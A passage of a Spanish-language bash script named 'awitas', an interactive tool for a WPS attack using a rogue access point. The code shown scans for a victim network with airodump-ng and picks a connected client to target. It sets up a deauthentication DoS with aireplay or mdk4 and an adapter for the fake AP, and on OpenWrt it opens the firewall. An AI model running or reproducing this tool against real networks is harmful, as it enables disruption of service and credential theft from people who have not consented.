	echo -e "       ${VIOLETA} Targets: ${AZUL}Marca y modelo: ${BLANCO}$mamo ${AZUL} BSSIDS:${BLANCO} $bssids${AZUL} ESSIDS:${BLANCO} $essids"
	echo 
	cuenta=$((cuenta+1))
	done
echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
read puesto
if [ -n "$puesto" ];then
	validar_numero $puesto config_ap
else
	echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opcion valida. Pulsa enter para intentarlo otra vez"        
        read
        config_ap
fi
grep -q $puesto ${pwd}modelos
if [ $? -ne 0 ];then
echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opcion valida. Pulsa enter para intentarlo otra vez"        
        read
        config_ap
fi
modelo=`cat ${pwd}modelos | grep $puesto | awk '{print $2}'`
comprobar
}
function clientes () {
clear
banner
sed -n ${1}p ${pwd}airodump >${pwd}elegida
macap=`cat ${pwd}elegida | cut -d ',' -f1`
maoui=`echo $macap | awk -F ":" '{print $1 $2 $3}'`
echo $cana1 >${pwd}canal &>/dev/null
rm ${pwd}macap 2>/dev/null
rm ${pwd}cliente* 2>/dev/null
echo "$macap" >${pwd}macap
marca=`grep $maoui oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
if [ -z $marca ];then
	marca=desconocido
fi
red=`cat ${pwd}elegida | cut -d ',' -f14`
echo;echo -e "${AMARILLO} TU ELECCION:"
echo;echo -e "${AMARILLO} Punto de acceso ${BLANCO}$red  ${AMARILLO}MAC ${BLANCO}$MAC $macap	${AMARILLO}Info OUI (marca)${BLANCO} $marca"
echo;echo -e "${AMARILLO} CLIENTES CONECTADOS:${BLANCO}";echo
cuenta=1
for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
do
	echo $i >${pwd}cliente${cuenta}
	maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
	marca_cliente=$`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
	echo -e "	${CYAN}MAC ${BLANCO} $i ${CYAN}Info OUI (marca) ${BLANCO} $marca_cliente"
	cuenta=$((cuenta+1))
done
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige una de las siguientes opciones:" ;echo
echo -e "		${AMARILLO}1)${BLANCO} Quiero elegir un cliente y continuar el ataque."
echo -e "		${AMARILLO}2)${BLANCO} Quiero elegir otra red de las que hemos escaneado ya."
echo -e "		${AMARILLO}3)${BLANCO} Quiero volver a escanear."
echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
read respuesta
if [ -z $respuesta ];then
        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para intentarlo de nuevo, y pon mas atencion: "
        read
        parseo
fi
validar_numero $respuesta parseo
if [ $respuesta = 1 ];then
	clear
	banner
	echo;echo -e "${AMARILLO}[::]${BLANCO} Ok!. Escoge un numero de cliente ";echo
	cuenta=1
	for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
	do
	        maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
        	marca_cliente=`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
        	echo -e "${AMARILLO} ${cuenta}) ${CYAN}MAC ${BLANCO} $i ${CYAN}Info OUI (marca) ${BLANCO} $marca_cliente"
        	cuenta=$((cuenta+1))
	done
	echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
	read opcion
	if [ -z $opcion ];then
        	echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
        	read
        	parseo
	fi
	validar_numero $opcion parseo
	cuenta=$((cuenta-1))
	if [ $opcion -le $cuenta ]; then
		mac_estacion=`cat ${pwd}cliente${opcion}`
       		elegir_dos
	else
    		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsuesta valida.  Pulsa enter para probar otra vez${NORMAL}"
       	read
       	parseo
    fi
elif [ $respuesta = 2 ];then
	parseo
elif [ $respuesta = 3 ];then
	airodump
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $respuesta${NORMAL} no es una opcion valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	parseo
	exit
fi
}
function elegir_dos() {
ls ${pwd}Openwrt
if [ $? -ne 0  ];then
	clear
	banner
	echo;echo -e "${AMARILLO}[::]${BLANCO} Como quieres hacer el DoS?"
	echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay."
	echo -e "${AMARILLO}  2)${BLANCO}  Mdk4."
	echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
	read opcion
	if [ -z $opcion ];then
        	echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
        	read
        	elegir_dos
	fi
	validar_numero $opcion elegir_dos
	if [ $opcion = "1" ];then
		mdk4=no
		ataque_dos=aireplay
	elif [ $opcion = "2" ];then
		mdk4=si
		ataque_dos=Mdk4
	else
		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion ${NORMAL}no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
		read
		elegir_dos
	fi
fi
config_ap
}
function banner () {
echo -e "${CYAN}                 _            "
echo -e "   __ ___      _(_) |_ __ _ ___ "
echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
echo -e " | (_| |\\ V  V /| | || (_| \\__ \\"
echo -e "  \\__,_| \\_/\_/ |_|\\__\\__,_|___/ $version byTux0"
echo -e "  ${VIOLETA}Ataque WPS transparente con rogue AP${BLANCO}   "
echo -n " Sistemas conocidos: "
for i in Wifislax Openwrt Kali Parrot Parrot_ARM RaspOS Debian Kali_ARM;do
	ls ${pwd}${i} &>/dev/null
	if [ $? -eq 0 ];then
		echo -n "${VERDE} $i "
		distro=si
	else
		echo -ne "${AZUL} $i "
	fi
done
if [ "$distro" != "si" ];then
        echo -n "${VERDE} Distro desconocida "
fi
echo
}
function parseo () {
clear
banner
cuenta=1
sed '/^[[:space:]]*$/d' ${pwd}airodump_csv-01.csv | tail -n +2  > ${pwd}airodump
echo;echo -e "${AMARILLO}[::]${BLANCO} Redes encontradas:";echo
while IFS= read -r line
do
	echo $line | grep Station >/dev/null
	if [ $? = 0 ];then
		break
	fi
	mac=`echo $line | cut -d ',' -f1`
	grep $mac ${pwd}airodump | grep -v WPA >/dev/null 
	if [ $? = 0 ];then
		clients="${VERDE}si${BLANCO}"
	else
		clients="${ROJO}no${BLANCO}"
	fi
	echo " ${AMARILLO}${cuenta})	${CYAN}BSSID${BLANCO}	`echo $line |  cut -d ',' -f1`	${CYAN}Canal${BLANCO}	`echo $line |  cut -d ',' -f4`	${CYAN}clientes${BLANCO} $clients	${CYAN}Nombre Ap${BLANCO}	`echo $line | cut -d ',' -f14`"
	cuenta=$((cuenta+1))
done < ${pwd}airodump
echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opcion: "
read red
if [ -v $red ];then
	airodump
else
	validar_numero $red parseo
	cuenta=$((cuenta-1))
	if [ $red -le $cuenta ]; then
		clientes $red 
	else
		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
		read
		parseo
	fi
fi
}
function airodump () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera escanear para buscar una victima."
echo -e "${AMARILLO}[::]${BLANCO} Vamos a buscar nuestra victima. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguira su marcha."
echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para iniciar la busqueda"
read
rm ${pwd}airodump* 2>/dev/null
airodump=1
if [ $banda5 = si ];then
	airodump-ng  --band a --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv #2>/dev/null
else
	airodump-ng  --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv 2>/dev/null
fi
airodump=0
parseo
}
function scan () {
echo -e "${AMARILLO}[::]${BLANCO} Poniendo $iface_dos en modo monitor..."
monitor poner
if [ $? = 0 ];then
	echo -e "${VERDE}[::]${BLANCO} Hecho!"
	sleep 1
else
	echo -e "${ROJO}[!!]${BLANCO} Algo salio mal. Saliendo..."
fi
airodump
}
function monitor () {
if [ $1 = quitar ];then
	ip link set dev $iface_dos down
	ip link set dev $iface_dos name $iface_dos
	ip link set dev $iface_dos up
	ip link set dev $iface_dos down
	iwconfig $iface_dos mode Managed
	ip link set dev $iface_dos up
elif [ $1  = poner ];then
	ip link set dev $iface_dos down
	if [ $? -eq 0 ];then
		iw dev $iface_dos set monitor none
    	ip link set dev $iface_dos up
		iface_mon=$iface_dos
   		echo $iface_mon >${pwd}iface_mon
   		echo $canal >${pwd}canal_mon &>/dev/null
	else
		echo " Se ha fallado al poner tu dispositivo en modo monitor. Revisa que tu dispositivo soporte esta opcion."
		exit 1
	fi
elif [ $1 = limpiar ];then
	echo "se ejecutar limpiar" >${pwd}limpiar
        ip link set dev $iface_dos down
        iwconfig $iface_dos mode Managed
        ip link set dev $iface_dos up
fi
}
function empezar () {
clear
banner
echo;echo -e "${CYAN} En la cabecera del sript puedes configurar algunas cosas. Quiza te venga bien."
echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas. Un poco de paciencia, se esta cociendo..."
if [ ! -e oui.txt ] && [ "$openwrt" != "1" ];then
	echo -e "${ROJO}[!!]${BLANCO} No tienes el archivo oui.txt. Este archivo servira para aportar informacion sobre los dispositivos que tratemos de atacar. No es necesario, pero es aconsejable.";echo
	echo -e "${AMARILLO}[::]${BLANCO} Escribe \"si\" para descargarlo o enter para no hacerlo. Si lo descargas ya no volveras a ver este mensaje. Escribe "cansino" si no quieres vover a ver este mensaje, pero tampoco descargar el archivo.  "
	echo;echo -ne "${AMARILLO}[??]${BLANCO} Respuesta: "
	read respuesta
	if [ "$respuesta" = si ];then
		echo -e "${VERDE}[>>]${BLANCO} Descargando..."
		wget  https://standards-oui.ieee.org/oui/oui.txt &>/dev/null
		echo -e "${VERDE}[::]${BLANCO} Descargado!. Enter para continuar. "
		read; empezar
	elif [ "$respuesta" == "cansino" ];then
		touch oui.txt
	else
		echo -e "${AMARILLO}[::]${BLANCO} Ok. Tu sabras.";echo
	fi
fi
if [ "$openwrt" != "1" ];then
	/etc/rc.d/rc.networkmanager stop >/dev/null 2>&1
	systemctl stop NetworkManager >/dev/null 2>&1
        systemctl stop wpa_supplicant >/dev/null 2>&1
	systemctl stop NetworkManager.service >/dev/null 2>&1
	service wpa_supplicant stop >/dev/null 2>&1
fi
eleccion_dispositivo
echo -e "${AMARILLO}[::]${BLANCO} Para hacer el ataque en la banda de 5 GHz, necesitamos que el dispositivo que haga el DoS inyecte en la banda de 5 GHz"
echo -e "${AMARILLO}[::]${BLANCO} Elige la banda en la que haremos el ataque:";echo
echo -e "${AMARILLO}  1)${BLANCO}   Banda de 5 GHz."
echo -e "${AMARILLO}  2)${BLANCO}   Banda de 2,4 GHz."
echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
read banda
if [ -z $banda ];then
	echo -ne "${ROJO}[!!]${BLANCO} Tienes que escribir uno de los numeros que se te proponen. Tan dificil es? pulsa enter para repetir. "
	read
	empezar
fi
validar_numero $banda empezar
if [ $banda -eq 1 ];then 
	banda5=si
	canal=100
elif [ $banda -eq "2" ];then
	banda5=no
	canal=6
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $banda${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"	
	read
	empezar
fi
clear
banner
if [ $banda5 = si ];then
	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 5 GHz"
else
	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 2,4 GHz"
fi
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que vamos a hacer es elegir un dispositivo para crear nuestro punto de acceso."
echo -e "${AMARILLO}[::]${BLANCO} El punto de acceso siempre se hara sobre la banda de 2,4 GHz, por lo que no es necesario que el dispositivo trabaje en 5 GHz"
echo -e "${AMARILLO}[::]${BLANCO} Por favor, ten en cuenta que el dispositivo tiene que soportar la opcion de crear puto de acceso."
eleccion_dispositivo
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para crear nuestro punto de acceso.";echo
cuenta=1
for i in `cat ${pwd}lista_interfaces`
do
	echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
	cuenta=$((cuenta+1))
done
cuenta=$((cuenta-1))
if [ $cuenta -eq 0 ];then
	echo -ne "${ROJO}[!!]${BLANCO} Es en serio? necesitas 2 dispositivos wireless para hacer el ataque y no tienes conectado ninguno. Pero tu sabes loque estas haciendo?. Anda, intoduce 2 dispositivos y pulsa enter para repetir. "
	read
	empezar
elif [ "$cuenta" == "1" ];then
	echo -ne "${ROJO}[!!]${BLANCO} Solo se ha detectado 1 adaptador wireless. Asi no podemos hacer el ataque. Introduce otro mas y pulsa enter para repetir. "
	read
	empezar
fi
echo;echo -ne "${AMARILLO}[??]${BLANCO} Debes estar seguro que soporta el modo AP. Opcion: "
read opcion
if [ -z $opcion ];then
	echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
	read
	empezar
fi
validar_numero $opcion empezar
if [ $opcion -le $cuenta ]; then
	cuenta=$((cuenta+1))
	sed -n ${opcion}p ${pwd}lista_interfaces | cut -f 1 >${pwd}iface_ap
	iface_ap=`cat ${pwd}iface_ap`
	echo -e "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_ap ${BLANCO}para crear nuestro punto de acceso. Pulsa enter para continuar."
	read
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsuesta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	empezar
fi
elegir_monitor
}
function elegir_monitor () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera elegir un dispositivo para el ataque DoS."
echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
echo -e "${AMARILLO}[::]${BLANCO} Recuerda que si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispotivo trabaje en la banda de 5GHz"
echo;echo "${ROJO} ATENCION!!${NORMAL} Que un dispositivo acepte el modo monitor no significa necesariamente que pueda hacer"
echo " un ataque de desautenticacion. Tendras que hacer tus propias pruebas para estar seguro.";echo
eleccion_dispositivo
echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
cuenta=1
for i in `cat ${pwd}lista_interfaces | grep -v $iface_ap`
do
	echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
	cuenta=$((cuenta+1))
done
echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opcion: "
read opcion
if [ -z $opcion ];then
        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
        read
        elegir_monitor
fi
validar_numero $opcion elegir_monitor 
cuenta=$((cuenta-1))
if [ $opcion -le $cuenta ]; then
	cuenta=$((cuenta+1))
  	cat ${pwd}lista_interfaces | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
	iface_dos=`cat ${pwd}iface_dos`
	echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa enter para continuar"
	read
	scan
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	elegir_monitor
fi
}
bandera=fax
systemctl stop lighttpd &>/dev/null
systemctl disable lighttpd &>/dev/null
if ! [ $(id -u) = 0 ]; then
	echo;echo -ne "${ROJO}[::]${BLANCO} El script se debe ejecutar con privilegios. Prueba con sudo. Pulsa enter para salir"
	salir=1
	read
	exit 1
fi
cat /etc/os-release | grep -q 'ID=parrot'
if [ $? -eq 0 ];then
	uname -m | grep aarch64 &>/dev/null
        if [ $? -eq 0 ];then
                kalirpi=1
                touch ${pwd}Parrot_ARM
        else
                kali=1
                touch ${pwd}Parrot
        fi

fi
cat /etc/os-release | grep -q 'ID=kali' 
if [ $? -eq 0 ];then
	uname -m | grep aarch64 &>/dev/null
        if [ $? -eq 0 ];then
                kalirpi=1
                touch ${pwd}Kali_ARM
        else
                kali=1
                touch ${pwd}Kali
        fi

fi
cat /etc/os-release | grep -i -q wifislax
if [ $? -eq 0 ];then
        wifislax=1
        touch ${pwd}Wifislax
fi

cat /etc/os-release | grep -i -q openwrt 
if [ $? -eq 0 ];then
	openwrt=1
	touch ${pwd}Openwrt
	bandera=w
	/etc/init.d/uhttpd stop &>/dev/null
	/etc/init.d/lighttpd stop &>/dev/null
	/etc/init.d/lighttpd disable &>/dev/null
 	estado=$(uci get firewall.@defaults[0].input)
	if [ $estado = "REJECT" ];then
		uci set firewall.@defaults[0].input=ACCEPT
  		/etc/init.d/firewall restart
	fi

fi
cat /etc/os-release | grep -q -i 'ID=debian' 
if [ $? -eq 0 ];then
        uname -m | grep aarch64 &>/dev/null
	if [ $? -eq 0 ];then
		raspos=1
		touch ${pwd}RaspOS
	else
		debian=1
		touch ${pwd}Debian
	fi
fi

empezar

